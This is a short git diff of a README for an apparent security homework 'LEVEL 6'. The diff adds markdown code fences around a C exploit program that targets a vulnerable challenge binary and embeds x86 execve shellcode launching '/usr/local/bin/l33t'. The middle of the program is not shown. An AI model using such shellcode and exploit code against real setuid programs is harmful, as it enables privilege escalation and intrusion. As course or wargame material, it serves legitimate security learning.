@@ -1,5 +1,6 @@
 # homeWork
 LEVEL 6
+```
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -7,7 +8,6 @@ LEVEL 6
 
 #define VULN "/var/challenge/level6/6" // vulnerable program
 char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";       // shellcode string
-
 int main() {
         unsigned int addr;
      // Define the commandline parameters that VULN expects
@@ -27,4 +27,4 @@ int main() {
 
      return 0;
 }
-
+```
